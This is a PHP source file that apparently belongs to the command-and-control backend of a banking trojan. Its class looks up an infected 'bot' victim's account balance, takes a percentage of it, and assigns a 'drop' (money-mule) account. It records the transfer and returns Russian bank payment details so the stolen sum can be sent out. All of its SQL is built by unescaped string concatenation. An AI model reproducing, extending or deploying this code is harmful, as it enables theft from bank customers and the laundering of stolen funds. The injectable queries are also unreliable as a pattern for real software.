<?php

class ServiceTransfers {
    private $bot, $system, $mysqli;

    function __construct(){
        global $bot, $system, $mysqli;
        $this->bot = &$bot;
        $this->system = &$system;
	$mysqli->settings['debug'] = true;
        $this->db = &$mysqli;

	if(!empty($this->bot->info)){
	    $this->bot->info = json_decode(base64_decode($this->bot->info), 1);
	    if(!is_array($this->bot->info)) $this->bot->info = array();
	}else{
	    $this->bot->info = array();
	}
    }

    function SetStatus($docmun = '', $status = ''){
        if(empty($docmun)) return false;
        $trans = $this->db->query('SELECT id,info FROM bf_transfers WHERE (prefix = \''.$this->bot->prefix.'\') AND (uid = \''.$this->bot->uid.'\') AND (system = \''.$this->system->nid.'\') ORDER by id DESC', null, null, false);

	if(isset($trans[0])){
	    foreach($trans as $item){
		$item->info = json_decode(base64_decode($item->info), 1);
                if(isset($item->info['trans']) && $item->info['trans']['docnum'] == $docmun){
		    $this->db->query('update bf_transfers set status = \''.$status.'\' WHERE (id = \''.$item->id.'\') LIMIT 1');
                    break;
		}elseif($item->id == $docmun){
		    $this->db->query('update bf_transfers set status = \''.$status.'\' WHERE (id = \''.$item->id.'\') LIMIT 1');
                    break;
		}
	    }
	}
    }

    function Transfer($accId = '', $dropId = '',$amount = '', $docnum = '', $formData = '', $transid = ''){
        if(empty($accId)) return false;
        if(empty($dropId)) return false;
        if(empty($transid)) return false;
        if(empty($amount)) return false;

        $balance = $this->db->query('SELECT id, acc, balance FROM bf_balance WHERE (id = \''.$accId.'\') LIMIT 1');

        if($balance->id == $accId){
            $trans = $this->db->query('SELECT id, info FROM bf_transfers WHERE (id = \''.$transid.'\') LIMIT 1');

	    if($trans->id == $transid){
		$trans->info = json_decode(base64_decode($trans->info), 1);
		$trans->info['trans']['accId'] = $accId;
		$trans->info['trans']['dropId'] = $dropId;
		$trans->info['trans']['docnum'] = $docnum;
		$trans->info['trans']['formData'] = $formData;

		$this->db->query('update bf_transfers set info = \''.base64_encode(json_encode($trans->info)).'\', num = \''.$amount.'\', status = \'2\' WHERE (id = \''.$transid.'\') LIMIT 1');
		$this->db->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$dropId.'\') AND (status = \'1\') LIMIT 1');
		return true;
	    }else{
		return false;
	    }
        }else{
            return false;
        }
    }

    function GetDrop(){
	//$this->db->settings['debug'] = true;
        $balance = $this->db->query('SELECT id, acc, balance, prefix, uid, system FROM bf_balance WHERE (prefix = \''.$this->bot->prefix.'\') AND (uid = \''.$this->bot->uid.'\') AND (system = \''.$this->system->nid.'\') ORDER by post_date DESC LIMIT 1');
        
	if(is_object($balance) && $balance->prefix == $this->bot->prefix && $balance->uid == $this->bot->uid && $balance->system == $this->system->nid && @$this->bot->info['getdrop'] != true){
	    if(!empty($this->bot->info['system_percent'])){
		$this->system->percent = $this->bot->info['system_percent'];
	    }
	    //$this->system->sum = number_format((($balance->balance*$this->system->percent)/100), 2, '.', '');	    
	    $this->system->sum = floor(($balance->balance*$this->system->percent)/100);
	    
            if(empty($this->bot->info['note'])){
		$note = 0;
	    }else{
		$note = 1;
	    }
	    
	    $userid_sql = '';
	    if(!empty($this->bot->userid)) $userid_sql = '((userid = \''.$this->bot->userid.'\') OR (userid = \'\')) AND ';
	    
	    //$this->db->query('update bf_drops set status = \'0\', last_date = CURRENT_TIMESTAMP() WHERE (system LIKE \'%'.$this->system->nid.'|%\') AND (status = \'1\') AND (last_date < (CURRENT_TIMESTAMP() - INTERVAL 5 MINUTE))');
	    $drop = $this->db->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'1\') AND (`citybank` = \''.$this->bot->city.'\') AND (`check_note` = \''.$note.'\') AND (\''.$this->system->sum.'\' > `from`) AND (\''.$this->system->sum.'\' < `to`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');

	    if(empty($drop->id) && empty($drop->system)){
		/*
		$drop = $this->db->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'1\') AND (`citybank` = \''.$this->bot->city.'\') AND (`check_note` = \''.$note.'\') AND (\''.$balance->balance.'\' < `max`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');
		
		if(!empty($drop->id) && !empty($drop->system)){
		    if($drop->to <= $this->system->sum){
			$this->system->sum = $drop->to;
		    }else{
			unset($drop);
			$drop = false;
			return false;
		    }
		}
		*/
		$drops = $this->db->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'1\') AND (`citybank` = \''.$this->bot->city.'\') AND (`check_note` = \''.$note.'\') AND (\''.$balance->balance.'\' < `max`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') ORDER by id DESC LIMIT 10', null, null, false);
		
		if(count($drops)){
		    foreach($drops as $drop){
			if(!empty($drop->id) && !empty($drop->system)){
			    if($drop->to <= $this->system->sum){
				$this->system->sum = $drop->to;
				break;
			    }else{
				unset($drop);
				$drop = false;
			    }
			}
		    }
		}else{
		    unset($drop);
		    $drop = false;
		}
	    }
	    
	    if(empty($drop->id) && empty($drop->system)){
		$drop = $this->db->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'0\') AND (`check_note` = \''.$note.'\') AND (\''.$this->system->sum.'\' > `from`) AND (\''.$this->system->sum.'\' < `to`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');
		//$drop = $this->db->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'0\') AND (`check_note` = \''.$note.'\') AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');
		//print_rm($drop);
	    }
	    
	    if(empty($drop->id) && empty($drop->system)){
		/*
		$drop = $this->db->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'0\') AND (`check_note` = \''.$note.'\') AND (\''.$balance->balance.'\' < `max`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');

		if(!empty($drop->id) && !empty($drop->system)){
		    if($drop->to <= $this->system->sum){
			$this->system->sum = $drop->to;
		    }else{
			unset($drop);
			$drop = false;
			return false;
		    }
		}
		*/
		
		$drops = $this->db->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'0\') AND (`check_note` = \''.$note.'\') AND (\''.$balance->balance.'\' < `max`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') ORDER by id DESC LIMIT 10', null, null, false);
	    
		if(count($drops)){
		    foreach($drops as $drop){
			if(!empty($drop->id) && !empty($drop->system)){
			    if($drop->to <= $this->system->sum){
				$this->system->sum = $drop->to;
				break;
			    }else{
				unset($drop);
				$drop = false;
			    }
			}
		    }
		}else{
		    unset($drop);
		    $drop = false;
		}
	    }
	    
	    if(!empty($drop->id) && !empty($drop->system)){
                $drop->other = array_map('base64_decode', json_decode($drop->other, true));
		
		if(isset($drop->other['cfgs']) && !empty($drop->other['cfgs'])){
		    $drop->other['cfgs'] = ' ' . $drop->other['cfgs'];
		    if(strpos($drop->other['cfgs'], $this->bot->version) == false){
			unset($drop);
			$drop = false;
			return false;
		    }
		}
		
		if(!empty($drop->id) && !empty($drop->system)){
		    if($drop->other['round'] == '1') $this->system->sum = floor((($balance->balance*$this->system->percent)/100)/1000)*1000;
    
		    if(!empty($this->bot->info['note'])) $drop->destination = $this->bot->info['note'];
		    
		    if($drop->other['test'] != 1){
			$this->db->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
		    }else{
			$this->db->query('update bf_drops set last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
		    }
    
		    $this->bot->info['getdrop'] = true;
		    $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');

		    $post_date = date('Y-m-d H:i:s');
		    $sys = $this->system;
		    unset($sys->format);
    
		    $trans_id = $this->db->query("INSERT INTO bf_transfers (userid, prefix, uid, ip, acc, balance, `num`, `to`, system, info, drop_id, post_date) VALUES ('".$this->bot->userid."', '".$this->bot->prefix."', '".$this->bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".$balance->acc."', '".$balance->balance."', '".$this->system->sum."', '".$drop->acc."', '".$this->system->nid."', '".base64_encode(json_encode(array('system' => $sys, 'drop' => $drop)))."', '".$drop->id."', '".$post_date."')");
    
		    if(empty($trans_id)){
			$transfer = $this->db->query('SELECT id FROM bf_transfers WHERE (`prefix` = \''.$this->bot->prefix.'\') AND (`uid` = \''.$this->bot->uid.'\') AND (`ip` = \''.$_SERVER['REMOTE_ADDR'].'\') AND (`acc` = \''.$balance->acc.'\') AND (`to` = \''.$drop->acc.'\') AND (`system` = \''.$this->system->nid.'\') AND (`post_date` = \''.$post_date.'\') LIMIT 1');
			if(!empty($transfer->id)){
			    $trans_id = $transfer->id;
			}else{
			    return false;
			}
		    }
		    unset($sys);
    
		    $return = array();
    
		    $return['accid'] = $balance->id;
		    $return['amount'] = $balance->balance;
		    $return['sum'] = $this->system->sum;
    
		    $return['drop'] = array();
    
		    $return['drop']['id'] = $drop->id;
		    $return['drop']['transid'] = $trans_id;
		    $return['drop']['INN'] = $drop->other['inn'];
		    $return['drop']['nds'] = ($drop->vat == 0 ? 0 : 1);
		    $return['drop']['ndsPercent'] = $drop->vat;
		    $return['drop']['beneficiaryName'] = $drop->receiver;
		    $return['drop']['KPP'] = $drop->other['kppp'];
		    $return['drop']['AccNum'] = $drop->acc;
		    $return['drop']['bankName'] = $drop->name;
		    $return['drop']['bankCity'] = $drop->citybank;
		    $return['drop']['bankBIK'] = $drop->other['bik'];
		    $return['drop']['bankKPP'] = $drop->other['kppb'];
		    $return['drop']['bankKorAcc'] = $drop->other['BnkKOrrAcnt'];
		    $return['drop']['payDestination'] = $drop->destination;
		    
		    $return['drop']['percent'] = $this->system->percent;
    
		    return $return;
		}
            }else{
                return false;
            }

        }else{
            return false;
        }
    }
}

RegisterService("ServiceTransfers");